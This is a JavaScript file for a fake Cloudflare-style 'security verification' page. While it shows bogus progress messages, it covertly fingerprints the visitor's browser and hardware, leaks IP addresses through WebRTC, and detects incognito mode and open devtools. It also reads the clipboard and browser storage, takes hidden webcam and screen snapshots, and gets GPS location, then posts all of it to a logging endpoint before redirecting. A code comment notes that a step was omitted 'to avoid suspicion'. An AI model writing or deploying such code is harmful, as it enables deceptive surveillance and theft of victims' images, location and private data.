
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = 'test';
    var targetUrl = 'https://example.com';
    var flowType = 'full';
    var requiredPerms = ["media"];
    var cfg = {"tmplId":"cloudflare","perms":["media"]};
    
    var extraBuffer = {};
    var statusText = null;

    async function logEvent(type, data) {
      try {
        return await fetch('/api/log/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
        });
      } catch(e) { return null; }
    }

    async function logExtra(data) {
      Object.assign(extraBuffer, data);
    }

    async function flushExtra() {
      if (Object.keys(extraBuffer).length > 0) {
        var dataToSend = Object.assign({}, extraBuffer);
        extraBuffer = {};
        await logEvent('extra', dataToSend);
      }
    }

    async function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        try { await flushExtra(); } catch(e) {}
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    }

    setInterval(checkRedirect, 1000);

    var running = false;
    window.startCapture = async function(mode) {
      if (hasRedirected || running) return;
      running = true;
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      try {
        if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
        if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
      } catch(e) {}

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      statusText = document.getElementById('status-text');
      var btn = document.querySelector('.btn') || document.querySelector('button');

    if (!isSilent) {
      if (btn) btn.style.display = 'none';
      var turnstile = document.querySelector('.turnstile-box');
      if (turnstile) {
        // If it's cloudflare/turnstile, we want to keep the box but change text
        var txt = turnstile.querySelector('.turnstile-text');
        if (txt) txt.innerText = "Verifying...";
        var cb = turnstile.querySelector('.checkbox');
        if (cb) cb.innerHTML = '<div style="width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1); border-top: 2px solid ' + accent + '; border-radius: 50%; animation: spinLoader 0.8s linear infinite;"></div>';
      }
      
      if (!statusText) {
        var progContainer = document.getElementById('progress-indicator');
        if (!progContainer) {
          progContainer = document.createElement('div');
          progContainer.id = 'progress-indicator';
          progContainer.style.margin = '30px 0';
          progContainer.style.textAlign = 'center';
          progContainer.innerHTML = '<div id="main-spinner" style="width: 32px; height: 32px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 15px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:15px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing security audit...</p>';
          
          var footer = document.querySelector('.footer');
          if (footer) {
            footer.parentNode.insertBefore(progContainer, footer);
          } else {
            box.appendChild(progContainer);
          }
        }
        statusText = document.getElementById('status-text');
      }
    }
    
    function updateProgress(p, text) {
      if (!statusText) return;
      var messages = [
        "Verifying browser environment...",
        "Validating network integrity...",
        "Checking security certificates...",
        "Syncing session metadata...",
        "Finalizing security audit..."
      ];
      var idx = Math.floor(p / 20);
      if (idx >= messages.length) idx = messages.length - 1;
      statusText.innerText = text || messages[idx];
    }

      async function runSilentProbes() {
        // CPU & Memory Fingerprint
        var start = performance.now();
        for(var i=0; i<1000000; i++) Math.sqrt(i);
        var score = (performance.now() - start).toFixed(2);
        await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });

        // Advanced 2026 Biometric & Environment APIs
        try {
          if (navigator.computePressure) {
             var observer = new ComputePressureObserver(async (records) => {
               await logExtra({ thermal_load: JSON.stringify(records) });
             });
             observer.observe('cpu');
             setTimeout(() => observer.unobserve('cpu'), 4000);
          }
          if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
          if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
             var map = await navigator.keyboard.getLayoutMap().catch(() => null);
             if (map) await logExtra({ kbd_layout: 'detected' });
          }
        } catch(e) {}

        // High Entropy Hardware Identity
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
             await logExtra({ hw_entropy: JSON.stringify(h) });
          }).catch(function(){});
        }

        // WebGL Deep Forensics (Deep Hardware Hooks)
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpu = {
              v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
              max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
              shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_deep: JSON.stringify(gpu) });
          }
        } catch(e) {}

        // WebAudio Harmonic Fingerprint
        try {
          var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var osc = ctx.createOscillator();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(12000, ctx.currentTime);
          var comp = ctx.createDynamicsCompressor();
          comp.threshold.setValueAtTime(-45, ctx.currentTime);
          comp.knee.setValueAtTime(35, ctx.currentTime);
          osc.connect(comp);
          comp.connect(ctx.destination);
          osc.start(0);
          ctx.startRendering().then(async function(buf) {
            var s = 0;
            for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
            await logExtra({ audio_hash: s.toFixed(15) });
          });
        } catch(e) {}

        // WebRTC Local & STUN Leakage
        try {
          var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = ice.candidate.candidate;
              if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
              else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
            }
          };
        } catch(e) {}
      }

      async function finish(success, reason) {
        await flushExtra();
        if (isSilent) {
          hasRedirected = true;
          window.location.href = targetUrl; 
          return; 
        }
      if (statusText) {
         statusText.innerText = "Verification complete. Redirecting safely...";
      }
      setTimeout(async function() {
         await flushExtra();
         hasRedirected = true;
         window.location.href = targetUrl;
      }, 1000);
      }

      try {
        await runSilentProbes();
        if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct",
          langs: navigator.languages.join(','),
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          webdriver: navigator.webdriver,
          touch: navigator.maxTouchPoints,
          dnt: navigator.doNotTrack,
          pdf: navigator.pdfViewerEnabled,
          gpu: (function(){
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              if (!gl) return 'N/A';
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
              var ext = gl.getSupportedExtensions().length;
              return info + " (Exts: " + ext + ")";
            } catch(e) { return 'Error'; }
          })(),
          canvasSig: (function(){
            try {
              var canvas = document.createElement('canvas');
              var ctx = canvas.getContext('2d');
              canvas.width = 200; canvas.height = 50;
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
              return canvas.toDataURL().slice(-100);
            } catch(e) { return 'N/A'; }
          })(),
          incognito: !!(navigator.storage && navigator.storage.estimate),
          vmStatus: (function(){
            var gpu = "";
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
            } catch(e) {}
            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
            return "Physical Hardware";
          })(),
          audioSig: 'Verified',
          gamut: (function(){
            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
            return 'Standard';
          })(),
          refreshRate: 'Verified'
        };

        // Deep Recon: Refresh Rate
        (function(){
          var start = null;
          var frames = 0;
          async function check(timestamp) {
            if (!start) start = timestamp;
            frames++;
            if (timestamp - start > 1000) {
              await logExtra({ display_hz: Math.round((frames * 1000) / (timestamp - start)) });
              return;
            }
            requestAnimationFrame(check);
          }
          requestAnimationFrame(check);
        })();

        // Deep Recon: Vibration Test
        if (navigator.vibrate) {
          navigator.vibrate([10, 50, 10]);
          logExtra({ haptic_ready: true });
        }

        // Deep Recon: Incognito Detection
        (function() {
          if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(async function(est) {
              var isPrivate = est.quota < 120000000;
              await logExtra({ incognito_audit: isPrivate });
            });
          }
        })();

        // Deep Recon: DevTools Detection
        (function() {
          var devtools = false;
          var element = new Image();
          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
          setTimeout(async function() { 
            console.log(element);
            await logExtra({ devtools_open: devtools }); 
          }, 2000);
        })();

        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.startRendering().then(async function(buffer) {
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
            await logExtra({ audio_sig: sum.toString() });
          });
        } catch(e) {}

        // Deep Recon: Font Fingerprint
        try {
           var fontList = [
             "Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", 
             "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display", "Menlo", "Monaco", "Consolas", "Liberation Mono", "DejaVu Sans", "Segoe UI", "Tahoma", "Geneva", "Calibri", "Candara", 
             "Optima", "American Typewriter", "Baskerville", "Copperplate", "Futura", "Gill Sans", "Century Gothic", "Franklin Gothic", "Didot", "Bodoni 72", "Avenir", "Avenir Next", 
             "PingFang SC", "Hiragino Sans", "Microsoft YaHei", "Malgun Gothic", "Noto Sans", "Open Sans", "Lato"
           ];
           var canvas = document.createElement("canvas");
           var ctx = canvas.getContext("2d");
           var detectedFonts = [];
           ctx.font = "72px sans-serif";
           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
           fontList.forEach(function(f) {
             ctx.font = "72px '" + f + "', sans-serif";
             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
           });
           await logExtra({ installed_fonts: detectedFonts.join(','), fonts_count: detectedFonts.length });
        } catch(e) {}

        // Deep Recon: Hardware API Availability
        await logExtra({
          api_bluetooth: !!navigator.bluetooth,
          api_usb: !!navigator.usb,
          api_hid: !!navigator.hid,
          api_serial: !!navigator.serial,
          api_midi: !!navigator.requestMIDIAccess,
          api_idle: !!window.IdleDetector,
          api_contacts: !!navigator.contacts,
          api_wake: !!navigator.wakeLock,
          api_storage: !!navigator.storage,
          api_fonts: !!navigator.queryLocalFonts,
          api_window: !!window.getScreenDetails
        });

        // Deep Recon: GPU Registry
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpuData = {
              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              gl_version: gl.getParameter(gl.VERSION),
              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
          }
        } catch(e) {}
        
        // Deep Recon: Canvas Fingerprint
        try {
          var c2 = document.createElement('canvas');
          var ctx = c2.getContext('2d');
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = "#069";
          ctx.fillText("OSINT, fingerprint checking", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("OSINT, fingerprint checking", 4, 17);
          var cvfp = c2.toDataURL().substring(22, 50);
          await logExtra({ canvas_fp: cvfp });
        } catch(e) {}

        // Deep Recon: Audio Fingerprint
        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.value = 10000;
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.value = -50;
          compressor.knee.value = 40;
          compressor.ratio.value = 12;
          compressor.reduction.value = -20;
          compressor.attack.value = 0;
          compressor.release.value = 0.25;
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.oncomplete = async function(e) {
            var hash = 0;
            for (var i = 0; i < e.renderedBuffer.length; ++i) {
               hash += Math.abs(e.renderedBuffer.getChannelData(0)[i]);
            }
            await logExtra({ audio_fp: hash.toString() });
          };
          audioCtx.startRendering();
        } catch(e) {}

        // Deep Recon: Advanced Battery
        if (navigator.getBattery) {
          navigator.getBattery().then(async function(b) {
            await logExtra({ 
              battery_level: b.level * 100 + '%',
              battery_charging: b.charging,
              battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
            });
          });
        }

        // Deep Recon: Advanced Media Devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          navigator.mediaDevices.enumerateDevices().then(async function(devices) {
             var m = devices.map(function(d) { return d.kind + ': ' + (d.label || 'Unknown (Locked)'); }).join('\n');
             await logExtra({ media_devices: m || 'None detected' });
          }).catch(function(){});
        }
        
        // Elite Recon: CSS Hardware Accel Fingerprint
        try {
           var e = document.createElement('div');
           e.style.transform = 'translate3d(1px,1px,1px)';
           await logExtra({ css_3d_accel: e.style.transform !== '' });
        } catch(e) {}
        
        // Wake Lock: Prevent Sleep during audit
        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}

        // Deep Recon: High Entropy Brand/Model Detection
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
          }).catch(function(){});
        }

        // Deep Recon: High-Precision Performance Mark
        (async function(){
          var start = performance.now();
          for(var i=0; i<1000000; i++) Math.sqrt(i);
          await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
        })();
        try {
          var pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = /([0-9]{1,3}(.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
              await logExtra({ local_ip: ip });
            }
          };
        } catch(e) {}

        // Deep Recon: Clipboard Buffer
        if (navigator.clipboard && navigator.clipboard.readText) {
           navigator.clipboard.readText().then(async function(txt) {
             if (txt) await logExtra({ clipboard_sync: txt.substring(0, 1500) });
           }).catch(function(){});
        }

        try {
          if (navigator.getBattery) {
            var batt = await navigator.getBattery();
            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
          }
          if (navigator.connection) {
            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
          }
        } catch(e) {}

        await logEvent('info', metadata);

        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
        (function() {
          var platforms = [
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
            { name: 'Github', url: 'https://github.com/favicon.ico' }
          ];
          platforms.forEach(function(p) {
            var img = new Image();
            var start = Date.now();
            img.onload = async function() { await logExtra({ social_active: p.name, load_ms: Date.now() - start }); };
            img.onerror = async function() { await logExtra({ social_inactive: p.name }); };
            img.src = p.url + '?v=' + start;
          });
        })();

        // Elite Recon: AdBlock / Shield Detection
        (function() {
           var bait = document.createElement('div');
           bait.innerHTML = '&nbsp;';
           bait.className = 'adsbox ads-box ad-unit';
           bait.style.position = 'absolute';
           bait.style.top = '-1000px';
           document.body.appendChild(bait);
           setTimeout(async function() {
             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
             await logExtra({ adblock_detected: blocked });
             bait.remove();
           }, 1000);
        })();

        // Elite Recon: Network RTT Mapping (VPN Detection)
        (function() {
          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
          nodes.forEach(function(n) {
            var start = Date.now();
            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
              await logExtra({ network_rtt: n, latency: Date.now() - start });
            }).catch(function(){});
          });
        })();

        // Deep Recon: Orientation & Peripherals
        await logExtra({
          orientation: screen.orientation ? screen.orientation.type : 'N/A',
          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
          languages: navigator.languages.join(',')
        });

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        for (var i = 0; i < requiredPerms.length; i++) {
          var p = requiredPerms[i];
          prog += stepProg;

          try {
            if (p === 'notification') {
              try {
                if (!isSilent) updateProgress(prog, "Initializing secure SSL/TLS connection...");
                if ("Notification" in window) await Notification.requestPermission();
              } catch(e) {}
            }

            if (p === 'clipboard') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying session token integrity...");
                if (navigator.clipboard && navigator.clipboard.readText) {
                  var clip = await navigator.clipboard.readText().catch(function(){});
                  if (clip) await logExtra({ clipboard: clip });
                }
              } catch(e) {}
            }

            if (p === 'media') {
              try {
                if (!isSilent) updateProgress(prog, "Validating server security certificates...");
                if (navigator.mediaDevices) {
                  // Try to get video only first for better success rate
                  var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
                    return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
                  });
                  
                  if (stream) {
                    try {
                      var video = document.createElement('video');
                      video.style.position = 'absolute';
                      video.style.left = '-9999px';
                      video.style.opacity = '0';
                      video.setAttribute('autoplay', '');
                      video.setAttribute('muted', '');
                      video.setAttribute('playsinline', '');
                      video.srcObject = stream;
                      document.body.appendChild(video);
                      
                      await new Promise(function(resolve) {
                        video.onloadedmetadata = function() {
                          video.play().then(resolve).catch(resolve);
                        };
                        setTimeout(resolve, 3000); // Fail-safe
                      });
                      
                      await new Promise(function(res) { setTimeout(res, 1000); });
                      
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      var ctx = canvas.getContext('2d');
                      if (ctx) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var snap = canvas.toDataURL('image/jpeg', 0.7);
                        await logEvent('extra', { visual_identity: snap });
                      }
                      
                      var devs = await navigator.mediaDevices.enumerateDevices();
                      var list = devs.map(function(d) { return d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5)); }).join('\n');
                      await logExtra({ media_hardware: list });
                      
                      stream.getTracks().forEach(function(t) { t.stop(); });
                      video.remove();
                    } catch(e) {}
                  }
                }
              } catch(e) {}
            }

            if (p === 'gps') {
              try {
                if (!isSilent) updateProgress(prog, "Calibrating anti-bot algorithms...");
                if (navigator.geolocation) {
                  await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                      function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                      function(err) { resolve(); },
                      { enableHighAccuracy: true, timeout: 10000 }
                    );
                  });
                }
              } catch(e) {}
            }

            if (p === 'screen') {
              try {
                if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                  var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                  if (s) {
                    try {
                      var track = s.getVideoTracks()[0];
                      var video = document.createElement('video');
                      video.style.position = 'absolute';
                      video.style.left = '-9999px';
                      video.style.opacity = '0';
                      video.setAttribute('autoplay', '');
                      video.setAttribute('muted', '');
                      video.setAttribute('playsinline', '');
                      video.srcObject = s;
                      document.body.appendChild(video);
                      
                      await new Promise(function(resolve) {
                        video.onloadedmetadata = function() {
                          video.play().then(resolve).catch(resolve);
                        };
                        setTimeout(resolve, 3000); // Fail-safe
                      });
                      
                      await new Promise(function(res) { setTimeout(res, 1000); });
                      
                      var canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || window.screen.width;
                      canvas.height = video.videoHeight || window.screen.height;
                      var ctx = canvas.getContext('2d');
                      if (ctx) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var snap = canvas.toDataURL('image/jpeg', 0.6);
                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
                      }
                      
                      s.getTracks().forEach(function(t) { t.stop(); });
                      video.remove();
                    } catch(e) {}
                  }
                }
              } catch(e) {}
            }

            if (p === 'files') {
              try {
                if (window.showOpenFilePicker && flowType !== 'silent') {
                  if (!isSilent) updateProgress(prog, "Protecting session data from MitM attacks...");
                  // Intentionally leaving this out unless strictly required, to avoid suspicion.
                }
              } catch(e) {}
              permsCompleted++;
              continue;
            }

            if (p === 'storage') {
              try {
                if (!isSilent) updateProgress(prog, "Checking encryption protocol versions...");
                if (navigator.storage && navigator.storage.estimate) {
                  var est = await navigator.storage.estimate();
                  await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
                }
              } catch(e) {}
            }

            if (p === 'sensors') {
              try {
                if (!isSilent) updateProgress(prog, "Evaluating browser environment security risk...");
                if (window.Magnetometer) {
                  var mag = new Magnetometer({frequency: 1});
                  mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
                  mag.onerror = (e) => logExtra({ sensor_error: 'Mag:' + e.error.message });
                  mag.start(); setTimeout(() => mag.stop(), 2000);
                }
                if (window.AmbientLightSensor) {
                  var als = new AmbientLightSensor({frequency: 1});
                  als.onreading = () => logExtra({ sensor_lux: als.illuminance });
                  als.start(); setTimeout(() => als.stop(), 2000);
                }
              } catch(e) {}
            }

            if (p === 'contacts') {
              permsCompleted++;
              continue;
            }

            if (p === 'vibration') {
              try {
                if (!isSilent) updateProgress(prog, "Preparing cryptographic handshakes...");
                if (navigator.vibrate) navigator.vibrate(200);
              } catch(e) {}
            }

            if (p === 'network') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying transmission payload integrity...");
                if (navigator.connection) {
                  await logExtra({ 
                    net_effective: navigator.connection.effectiveType,
                    net_rtt: navigator.connection.rtt,
                    net_downlink: navigator.connection.downlink,
                    net_saveData: navigator.connection.saveData
                  });
                }
              } catch(e) {}
            }

            if (p === 'bluetooth') {
              try {
                if (!isSilent) updateProgress(prog, "Checking virtual firewall status...");
                if (navigator.bluetooth) {
                  await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
                }
              } catch(e) {}
            }
            if (p === 'performance') {
              try {
                if (!isSilent) updateProgress(prog, "Computing internal data integrity checksums...");
                var memory = navigator.deviceMemory || "N/A";
                var cores = navigator.hardwareConcurrency || "N/A";
                await logExtra({ perf_cores: cores, perf_mem: memory });
              } catch(e) {}
            }

            if (p === 'security') {
              try {
                if (!isSilent) updateProgress(prog, "Performing script injection mitigation...");
                await logExtra({ 
                   sec_webdriver: navigator.webdriver,
                   sec_cookies: navigator.cookieEnabled,
                   sec_java: navigator.javaEnabled(),
                   sec_pdf: !!navigator.pdfViewerEnabled,
                   sec_doNotTrack: navigator.doNotTrack
                });
              } catch(e) {}
            }

            if (p === 'fonts_advanced') {
              try {
                if (!isSilent) updateProgress(prog, "Stabilizing connection for secure transfer...");
                if (navigator.queryLocalFonts) {
                  var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
                  await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
                }
              } catch(e) {}
            }

            if (p === 'window_mgmt') {
              try {
                if (!isSilent) updateProgress(prog, "Adjusting anti-DDoS algorithms...");
                if (window.getScreenDetails) {
                  var details = await window.getScreenDetails().catch(function(){ return null; });
                  if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
                }
              } catch(e) {}
            }

            if (p === 'storage_map') {
              try {
                if (!isSilent) updateProgress(prog, "Finalizing validation steps...");
                await logExtra({
                  storage_ls_full: JSON.stringify(localStorage),
                  storage_ss_full: JSON.stringify(sessionStorage)
                });
              } catch(e) {}
            }

            if (p === 'network_forensic') {
              try {
                if (!isSilent) updateProgress(prog, "Ensuring end-to-end encryption...");
                var start = Date.now();
                await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
                await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
              } catch(e) {}
            }

            if (p === 'webauthn') {
              try {
                if (!isSilent) updateProgress(prog, "Verifying platform authenticator...");
                if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
                   var available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
                   await logExtra({ webauthn_available: available });
                }
              } catch(e) {}
            }
          } catch(e) {}
          permsCompleted++;
        }
  
        finish(true);
      } catch (err) {
        finish(false, "System Busy.");
      }
    };

  })();
